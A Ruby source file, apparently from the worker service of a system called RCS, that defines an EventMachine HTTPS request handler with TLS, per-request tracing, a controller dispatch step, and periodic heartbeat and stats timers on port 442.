#
#  Event handlers
#

# relatives
require_relative 'heartbeat'
require_relative 'worker_controller'
require_release 'rcs-db/parser'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/systemstatus'

# system
require 'eventmachine'
require 'em-http-server'
require 'socket'

module RCS
module Worker

class HTTPHandler < EM::HttpServer::Server
  include RCS::Tracer
  include RCS::DB::Parser
  
  attr_reader :peer
  attr_reader :peer_port
  
  def post_init

    @request_time = Time.now

    # get the peer name
    if get_peername
      @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    else
      @peer = 'unknown'
      @peer_port = 0
    end

    @network_peer = @peer

    # timeout on the socket
    set_comm_inactivity_timeout 60

    # we want the connection to be encrypted with ssl
    start_tls({:private_key_file => RCS::DB::Config.instance.cert('DB_KEY'),
               :cert_chain_file => RCS::DB::Config.instance.cert('DB_CERT'),
               :verify_peer => false})


    trace :debug, "Connection from #{@network_peer}:#{@peer_port}"
  end

  def closed?
    @closed
  end

  def unbind
    trace :debug, "Connection closed #{@peer}:#{@peer_port}"
    @closed = true
  end

  def process_http_request
    #trace :info, "[#{@peer}] Incoming HTTP Connection"
    size = (@http_content) ? @http_content.bytesize : 0
    trace :debug, "[#{@peer}] REQ: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time}) #{size.to_s_bytes}"

    # get it again since if the connection is kept-alive we need a fresh timing for each
    # request and not the total from the beginning of the connection
    @request_time = Time.now

    # update the connection statistics
    # StatsManager.instance.add conn: 1

    # $watchdog.synchronize do

      responder = nil

      # Block which fulfills the request
      operation = proc do

        trace :debug, "[#{@peer}] QUE: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time})"

        generation_time = Time.now

        begin
          raise "Invalid http protocol (#{@http_protocol})" if @http_protocol != 'HTTP/1.1' and @http_protocol != 'HTTP/1.0'

          # parse all the request params
          request = prepare_request @http_request_method, @http_request_uri, @http_query_string, @http_content, @http, @peer

          request[:time] = {start: @request_time}
          # request[:time][:queue] = generation_time - @request_time

          # get the correct controller
          controller = WorkerController.new
          controller.request = request

          # do the dirty job :)
          responder = controller.act!

          # create the response object to be used in the EM::defer callback
          reply = responder.prepare_response(self, request)

          # keep the size of the reply to be used in the closing method
          @response_size = reply.content ? reply.content.bytesize : 0
          trace :debug, "[#{@peer}] GEN: [#{request[:method]}] #{request[:uri]} #{request[:query]} (#{Time.now - generation_time}) #{@response_size.to_s_bytes}"

          reply
        rescue Exception => e
          trace :error, e.message
          trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")

          responder = RCS::DB::RESTResponse.new(RESTController::STATUS_BAD_REQUEST)
          reply = responder.prepare_response(self, {})
          reply
        end

      end

      # Callback block to execute once the request is fulfilled
      response = proc do |reply|
        reply.send_response

         # keep the size of the reply to be used in the closing method
        @response_size = reply.headers['Content-length'] || 0
      end


      # Let the thread pool handle request
      EM.defer(operation, response)

    # end

  end

end #HTTPHandler


class Events
  include RCS::Tracer
  
  def setup(port = 442)

    # main EventMachine loop
    begin
      EM.epoll
      EM.threadpool_size = 50

      EM::run do

        # start the HTTP REST server
        EM::start_server("0.0.0.0", port, HTTPHandler)
        trace :info, "Listening for https on port #{port}..."

        EM.defer(proc{ HeartBeat.perform })

        EM::PeriodicTimer.new(RCS::DB::Config.instance.global['HB_INTERVAL']) do
          EM.defer { HeartBeat.perform }
        end

        # calculate and save the stats
        EM::PeriodicTimer.new(60) { EM.defer(proc{ StatsManager.instance.calculate }) }

        trace :info, "RCS Worker '#{RCS::DB::Config.instance.global['SHARD']}' ready!"
      end
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor'
        trace :fatal, "Cannot bind port #{port}"
        return 1
      end
      raise
    end

  end

end #Events

end #Collector::
end #RCS::

